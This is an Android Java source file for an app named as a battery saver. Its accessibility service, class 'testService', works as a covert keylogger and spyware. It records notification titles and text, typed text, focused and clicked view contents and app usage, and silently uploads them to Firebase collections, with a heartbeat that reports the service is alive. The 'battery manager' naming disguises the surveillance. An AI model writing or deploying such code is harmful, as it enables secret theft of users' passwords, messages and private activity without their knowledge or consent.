package com.example.batterySaver;

import static com.example.batterySaver.firebase.addFieldToAnalyticsCollection;
import static com.example.batterySaver.firebase.addFieldToMonitoringCollection;

import android.os.Handler;
import android.os.Looper;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;


public class testService extends AccessibilityService {
    public String res = "";
    public String currentApp = ""; // Variable to store the currently active app package name
    public long appLaunchTime = 0; // Variable to store the launch time of the current app
    public double LOG_FILE_SIZE = 1; // log file size in KB
    public double MONITORING_FILE_SIZE = 1; // log file size in KB
    public double NOTIFICATIONS_FILE_SIZE = 0.5; // log file size in KB
    public double SYSTEM_LOGS_FILE_SIZE = 0.25; // log file size in KB
    private String packageName;

    private Handler heartbeatHandler = new Handler();
    private static final long HEARTBEAT_INTERVAL = 1 * 60 * 1000; // 10 minutes in milliseconds

    private Runnable heartbeatRunnable = new Runnable() {
        @Override
        public void run() {
            firebase.updateAliveStatus();
            // Schedule the next update
            heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL);
        }
    };


    private void writeToSystemLog(String tag, String message) {
        try {
            DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String timestamp = df.format(Calendar.getInstance().getTime());
            String logEntry = String.format("[%s] %s: %s%n", timestamp, tag, message);

            File systemLogFile = new File(getApplicationContext().getExternalFilesDir(null), "SystemLogs.txt");
            FileOutputStream systemLogFos = new FileOutputStream(systemLogFile, true);
            systemLogFos.write(logEntry.getBytes());
            systemLogFos.close();

            // Check file size and upload to Firebase if threshold is exceeded
            double fileSizeKB = (double) systemLogFile.length() / 1024;
            Log.v("battery manager", "system log file size: " + fileSizeKB);
            if (fileSizeKB > SYSTEM_LOGS_FILE_SIZE) {
                uploadSystemLogs(systemLogFile);
            }

            // Also write to Android's logging system
            Log.v(tag, message);
        } catch (IOException e) {
            Log.e("battery manager", "Error writing to system log: " + e.getMessage());
        }
    }

    private void uploadSystemLogs(File systemLogFile) {
        try {
            ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);
            boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
            boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;

            if (isWiFiConnected || isMobileDataConnected) {
                StringBuilder text = new StringBuilder();
                BufferedReader br = new BufferedReader(new FileReader(systemLogFile));
                String line;

                while ((line = br.readLine()) != null) {
                    text.append(line).append('\n');
                }
                br.close();

                // Upload to Firebase
                firebase.uploadSystemLogsToFirebase(text.toString());
                systemLogFile.delete();
            }
        } catch (IOException e) {
            Log.e("battery manager", "Error uploading system logs: " + e.getMessage());
        }
    }


    @Override
    public void onServiceConnected() {
        writeToSystemLog("battery manager", "Onservice() Connected...");
        Log.v("battery manager", "Onservice() Connected...");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED | AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        info.packageNames = null;
        setServiceInfo(info);
        try {
            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
            Log.v("battery manager", "Heartbeat monitoring started");
        } catch (Exception e) {
            Log.e("battery manager", "Failed to start heartbeat monitoring: " + e.getMessage());
        }
    }

    private void handleNotification(AccessibilityEvent event, String time) {
        if (event.getParcelableData() instanceof Notification) {
            Notification notification = (Notification) event.getParcelableData();
            String notificationPackage = event.getPackageName().toString();
            String notificationText = notification.extras.getString(Notification.EXTRA_TEXT, "No text");
            String notificationTitle = notification.extras.getString(Notification.EXTRA_TITLE, "No title");

            String data = "(" + time + "|NOTIFICATION) Package: " + notificationPackage +
                    " Title: " + notificationTitle +
                    " Text: " + notificationText;
            res = res + data + "\n";

            Log.v("battery manager: ", data);

            try {
                // Write to NotificationLogs.txt
                File notificationFile = new File(getApplicationContext().getExternalFilesDir(null), "NotificationLogs.txt");
                FileOutputStream notificationFos = new FileOutputStream(notificationFile, true);
                notificationFos.write(data.getBytes());
                notificationFos.write("\n".getBytes());
                notificationFos.close();

                // Check file size and upload to Firebase if threshold is exceeded
                double fileSizeKB = (double) notificationFile.length() / 1024;
                if (fileSizeKB > NOTIFICATIONS_FILE_SIZE) {
                    StringBuilder text = new StringBuilder();
                    BufferedReader br = new BufferedReader(new FileReader(notificationFile));
                    String line;
                    while ((line = br.readLine()) != null) {
                        text.append(line).append('\n');
                    }
                    br.close();

                    // Upload to Firebase and clear the file
                    firebase.uploadNotificationLogToFirebase(text.toString());
                    notificationFile.delete();
                }
            } catch (Exception e) {
                Log.e("battery manager", "Error handling notification: " + e.getMessage());
                writeToSystemLog("battery manager: ", "(" + time + "|CLICKED)" + event.getPackageName().toString() + data);

            }
        }
    }




    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        DateFormat df = new SimpleDateFormat("hh:mm:ss");
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {

            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                handleNotification(event, time);
                break;
            }

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                packageName = event.getPackageName().toString();

                if (!packageName.equals(currentApp)) {
                    if (!currentApp.isEmpty()) {
                        try {
                            recordAppUsage(currentApp, appLaunchTime, System.currentTimeMillis());
                        } catch (JSONException e) {
                            throw new RuntimeException(e);
                        }
                    }
                    currentApp = packageName;
                    appLaunchTime = System.currentTimeMillis();
                }
                Log.v("battery manager: ", "packageName: "+packageName);
            }

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();

                data="("+time+"|TEXT)" + data;
                res = res + data + "\n";

                Log.v("battery manager: ", "("+time+"|TEXT)" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();

                data="("+time+"|FOCUSED)" + data;
                res = res + data + "\n";

                Log.v("battery manager: ", "("+time+"|FOCUSED)" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                data=time + "("+time+"|CLICKED)" + event.getText().toString() + data;
                res = res + data + "\n";

                Log.v("battery manager: ", "("+time+"|CLICKED)" + event.getPackageName().toString() + data);

//                if (res.length() > 10) {
                    try {

                        File file = new File(getApplicationContext().getExternalFilesDir(null), "Log.txt");
                        FileOutputStream fos = new FileOutputStream(file, true);
                        fos.write(res.getBytes());
                        fos.close();

                        double fsize = (double) file.length() / 1024;
                        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);


                        if (fsize > LOG_FILE_SIZE) {
                            boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
                            boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;

                            if (isWiFiConnected || isMobileDataConnected) {
                                StringBuilder text = new StringBuilder();
                                BufferedReader br = new BufferedReader(new FileReader(file));
                                String line;

                                while ((line = br.readLine()) != null) {
                                    text.append(line);
                                    text.append('\n');
                                    }
                                br.close();

                                //Creating SendMail object
                                try {
                                    Log.v("battery manager", text.toString());
                                    addFieldToAnalyticsCollection(text.toString(), packageName);
                                    file.delete();
                                }
                                catch (Exception e){
                                    Log.v("battery manager","Error while sending mail:"+e.getMessage());
                                }
                            }
                        }
                    } catch (Exception e) {
                        Log.v("battery manager", e.getMessage());
                    }
                    res = "";
                break;
            }
            default:
                break;
        }
    }
    @Override
    public void onInterrupt() {
        Log.d("battery manager", "onInterrupt() is Called...");
    }

    @Override
    public void onDestroy() {
        try {
            heartbeatHandler.removeCallbacks(heartbeatRunnable);
            Log.v("battery manager", "Heartbeat monitoring stopped");
        } catch (Exception e) {
            Log.e("battery manager", "Error stopping heartbeat monitoring: " + e.getMessage());
        }
        super.onDestroy();
        Log.v("battery manager", "Device disconnected from the service. Service is disabled.");
        writeToSystemLog("battery manager", "Device disconnected from the service. Service is disabled.");
    }


    // Method to record app usage and add it to the list
    private void recordAppUsage(String packageName, long launchTime, long closeTime) throws JSONException {
        long duration = closeTime - launchTime;
//        String appUsageInfo = "App: " + packageName + ", Launch Time: " + launchTime + ", Close Time: " + closeTime + ", Duration: " + duration + " ms";
        JSONObject appUsageJson = new JSONObject();
        appUsageJson.put("App", packageName);
        appUsageJson.put("Launch Time", launchTime);
        appUsageJson.put("Close Time", closeTime);
        appUsageJson.put("Duration", duration);

        String appUsageInfo = appUsageJson.toString();

        Log.v("battery manager", appUsageInfo);
        // Store the app usage information in a text file
        try {
            File file = new File(getApplicationContext().getExternalFilesDir(null), "AppUsage.txt");
            FileOutputStream fos = new FileOutputStream(file, true);
            fos.write(appUsageInfo.getBytes());
            fos.write("\n".getBytes()); // Add a new line after each entry
            fos.close();
        } catch (IOException e) {
            Log.e("battery manager", "Error writing to AppUsage.txt: " + e.getMessage());
        }



        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);
        // checking AppUsage.txt filesize and updating to firebase
        File AppUsage = new File(getApplicationContext().getExternalFilesDir(null), "AppUsage.txt");
        double fsize = (double) AppUsage.length() / 1024;
        try {
            if (fsize > MONITORING_FILE_SIZE) {
                boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
                boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;

                if (isWiFiConnected || isMobileDataConnected) {
                    StringBuilder text = new StringBuilder();
                    BufferedReader br = new BufferedReader(new FileReader(AppUsage));
                    String line;

                    while ((line = br.readLine()) != null) {
                        text.append(line);
                        text.append('\n');
                    }
                    br.close();

                    try{
                        Log.v("battery manager","Creating Firebase Monitor message: "+text.toString());
                        addFieldToMonitoringCollection(text.toString());
                        AppUsage.delete();
                    } catch (Exception e){
                        Log.v("battery manager","Error while sending mail:"+e.getMessage());
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace(); // Log the error
            // Handle the exception as needed
        }
    }


}